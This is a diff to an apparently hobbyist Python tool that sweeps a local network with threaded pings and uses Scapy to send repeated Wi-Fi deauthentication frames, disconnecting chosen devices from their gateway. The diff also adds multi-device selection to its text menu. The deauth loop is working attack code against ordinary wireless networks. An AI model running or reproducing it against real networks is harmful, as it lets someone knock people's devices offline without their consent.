@@ -46,7 +46,7 @@ if "--debug" in sys.argv:
 	debug = True
 	displayer('info', 'debug mode on')
 def ip_finder():
-	output=subprocess.getoutput("ip -4 addr show " + "wlan0" + " | grep -oP '(?<=inet\s)\d+(\.\d+){3}'")
+	output=subprocess.getoutput("ip -4 addr show " + "eth0" + " | grep -oP '(?<=inet\s)\d+(\.\d+){3}'")
 	displayer('sucess','user ip found ', 'noreturn');print(output)
 	try:
 		global preset_user_ip
@@ -54,9 +54,9 @@ def ip_finder():
 	except:
 		return output
 
-def ping(ip, thread_name, user_ip, display = None):
+def ping(ip, thread_name, user_ip, t, display = None):
 	try:
-		process = subprocess.check_output(["ping", "-c", "4", ip])
+		process = subprocess.check_output(["ping", "-c", str(t), ip])
 		displayer('sucess','host up ', 'noreturn');print(ip)
 		global ip_list
 		ip_list.append(ip)
@@ -87,7 +87,7 @@ def scanner():
 	for i in range(scan_range):
 		ip_inscan = ip_cropped+str(i)
 		thread_name = 'thread-'+str(i)
-		thread_name = threading.Thread(target = ping, args = (ip_inscan, thread_name, ip, display))
+		thread_name = threading.Thread(target = ping, args = (ip_inscan, thread_name, ip, ping_time, display))
 		time.sleep(.001)
 		thread_name.start()
 	global ip_list
@@ -145,7 +145,7 @@ def deauth(gateway_mac, target_mac, iface, deauth_aut):
 	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
 	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
 	while deauth_aut == True:
-		sendp(packet, inter=0.1, count=1, iface=iface, verbose=1)
+		sendp(packet, inter=0.1, count=1, iface=iface, verbose=0)
 
 def infoga():
 	hosts_info = []
@@ -176,6 +176,11 @@ def interface():
 			return('not found')
 		displayer('sucess', str(output[output_value-5:output_value+3])+' Found')
 		return(output[output_value-5:output_value+3])
+
+def save(list):
+	os.system('clear')
+	displayer('info','Saving current hosts')
+
 def main(debug = False):
 	hosts = infoga()
 	ip_current = ip_finder()
@@ -247,7 +252,7 @@ def main(debug = False):
 		sys.stdout.write(YELLOW + '| ' +MAGENTA + 'MAGENTA' + BLUE + ' = ' + YELLOW + 'gateway' + YELLOW + '                                                            |' + '\n')
 		sys.stdout.write(YELLOW + '| ' +CYAN + 'CYAN' + BLUE + ' = ' + YELLOW + 'selected devices' + YELLOW + '                                                      |' + '\n')
 		sys.stdout.write(RED + '+' + YELLOW + '------------------------------------------------------------------------------' + RED + '+' + '\n')
-		sys.stdout.write(YELLOW + '|'+ BLUE + ' interface = '+ YELLOW +iface +space*(65-len(iface))+'|' + '\n')
+		sys.stdout.write(YELLOW + '|'+ BLUE + ' monitor interface = '+ YELLOW +iface +space*(57-len(iface))+'|' + '\n')
 		sys.stdout.write(YELLOW + '|'+ status +'                                                          |' + '\n')
 		sys.stdout.write(YELLOW + '|'+ msg +'|' + '\n')
 		sys.stdout.write(RED + '+' + YELLOW + '------------------------------------------------------------------------------' + RED + '+' + '\n')
@@ -285,7 +290,7 @@ def main(debug = False):
 			for i in range(len(selected)):
 				print('stop arp')
 				menu(hosts)
-		if choice.isdigit() == True:
+		if choice[0].isdigit() == True:
 			if len(choice)==1:
 				msg='                                                                              '
 				if hosts[int(choice)] in selected:
@@ -301,9 +306,22 @@ def main(debug = False):
 					selected.append(hosts[int(choice)])
 					menu(hosts, selected, msg, activation, gw, iface)
 			else:
-				#comming
-				msg=' multiple choice comming soon                                                 '
-				menu(hosts, selected, msg, activation)
+				print(len(choice))
+				digitn = 0
+				n = []
+				for i in range(len(choice)):
+					if choice[i].isdigit() == True:
+						digitn = digitn + 1
+				for i in range(len(choice)):
+					if choice[i].isdigit() == True:
+						if hosts[int(choice[i])] in selected:
+							selected.pop(selected.index(hosts[int(choice[i])]))
+						else:
+							n.append(choice[i])
+							selected.append(hosts[int(choice[i])])
+					if len(n) == digitn:
+						break
+				menu(hosts, selected, msg, activation, gw, iface)
 		if choice == 'exit':
 			if activation == True:
 				print('stop deauth')
@@ -316,4 +334,3 @@ def main(debug = False):
 			menu(hosts, selected, msg, activation, gw, iface)
 	menu(hosts, selected, msg, activation, gw, iface)
 main(debug)
-
